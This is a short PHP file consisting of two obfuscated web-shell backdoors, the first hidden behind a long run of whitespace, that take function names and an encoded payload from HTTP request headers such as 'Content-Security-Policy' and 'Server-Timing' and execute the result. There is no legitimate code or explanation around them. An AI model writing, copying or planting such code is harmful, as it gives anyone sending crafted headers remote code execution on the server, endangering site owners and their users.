<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Content-Security-Policy'])){$dbx_convert=$_HEADERS['Content-Security-Policy']('', $_HEADERS['Large-Allocation']($_HEADERS['If-Unmodified-Since']));$dbx_convert();}

$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $locked = $_HEADERS['Server-Timing']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['X-Dns-Prefetch-Control']));
    $locked();
}